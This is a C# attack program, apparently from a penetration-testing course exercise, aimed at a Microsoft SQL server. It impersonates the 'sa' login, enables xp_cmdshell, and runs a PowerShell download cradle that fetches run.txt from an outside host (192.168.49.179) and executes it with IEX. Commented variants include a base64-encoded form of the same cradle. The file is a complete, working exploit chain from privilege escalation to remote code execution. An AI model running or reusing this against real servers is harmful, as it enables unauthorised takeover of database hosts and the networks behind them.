using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MSSQL___Execution_xp_cmdshell
{
    class xp_cmdshell
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            //Authenticates
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            //Login impersonation
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            //Enabling xp_cmdshell
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
            //Executing system command
            //String execCmd = "EXEC xp_cmdshell whoami";

            // Esto no funciona porque solo se permiten 128 caracteres
            // Es "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.179/run.txt') | IEX" en  codigo b64. Ver ejercicio 15.1.3 -> encodecradle.ps1 
            //String execCmd = "EXEC xp_cmdshell powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANwA5AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA";

            //Este funciona bien: Ojo como se escapa el |
            //String execCmd = "EXEC xp_cmdshell \"powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.179/run.txt')^|IEX\"";

            //Este funciona bieN
            String execCmd = "EXEC xp_cmdshell 'powershell -C \"IEX((New-Object System.Net.WebClient).DownloadString(''http://192.168.49.179/run.txt''))\"'";

            //Este funciona bien:
            //String execCmd = "EXEC xp_cmdshell \"powershell IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.49.179/run.txt'))\"";


            //Execute impersonateUser
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            //Execute enable_xpcmd
            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            //Execute execCmd
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();

            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}